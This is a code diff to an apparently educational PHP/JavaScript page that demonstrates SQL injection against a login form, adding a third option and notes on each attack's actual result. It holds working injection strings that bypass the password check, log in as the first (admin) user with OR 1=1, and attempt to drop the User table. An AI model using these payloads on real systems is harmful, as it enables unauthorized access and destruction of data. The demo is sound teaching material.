@@ -41,6 +41,7 @@
                     <optgroup label="SQL Injection">
                         <option selected="selected" value="1" >Ignore password</option>
                         <option value="2">Delete user table</option>
+                        <option value="3">No credentials</option>
                     </optgroup>
                 </select>
                 <?php
@@ -97,17 +98,27 @@
         if(sqlinject.options[sqlinject.selectedIndex].text === "Ignore password")
         {
             injectiondiv.innerHTML = "<p>Statement to execute: </p>" +
-                " <p>Select * FROM User WHERE Email='admin@email.com'–-' AND Password='';</p>" +
-                "<p>Intended result: Ignores AND Password='' because -- is a comment </p>";
-            usernamefield.value = "admin@email.com'--";
+                " <p>Select * FROM User WHERE Email='student@email.com'–- AND Password='';</p>" +
+                "<p>Intended result: Ignores AND Password='' because -- is a comment </p>" +
+                "<p>Actual result: Same as intended </p>";
+            usernamefield.value = "student@email.com'--";
         }
         else if(sqlinject.options[sqlinject.selectedIndex].text === "Delete user table")
         {
             injectiondiv.innerHTML = "<p>Statement to execute: </p> " +
-                "<p>Select * FROM User WHERE Email='student@email.com' AND Password='Password3; DROP TABLE User;</p>" +
-                "<p>Intended result: Drops the User table after logging in </p>";
-            usernamefield.value = "student@email.com"
-            passwordfield.value = "Password3; DROP TABLE User;";
+                "<p>Select * FROM User WHERE Email='student@email.com' AND Password=' OR 1=1; DROP TABLE User;</p>" +
+                "<p>Intended result: Drops the User table after logging in </p>" +
+                "<p>Actual result: Logs in, but does not drop user table. query seems to not support batch instructions. </p>";
+            usernamefield.value = "student@email.com";
+            passwordfield.value = "' OR 1=1; DROP TABLE User";
+        }
+        else if(sqlinject.options[sqlinject.selectedIndex].text === "No credentials")
+        {
+            injectiondiv.innerHTML = "<p>Statement to execute: </p> " +
+                "<p>Select * FROM User WHERE Email='student@email.com' OR 1=1;-- AND Password='';</p>" +
+                "<p>Intended result: Logs in as the first user (Admin) </p>" +
+                "<p>Actual result: Same as intended</p>";
+            usernamefield.value = "student@email.com' OR 1=1;--";
         }
     }
 </script>
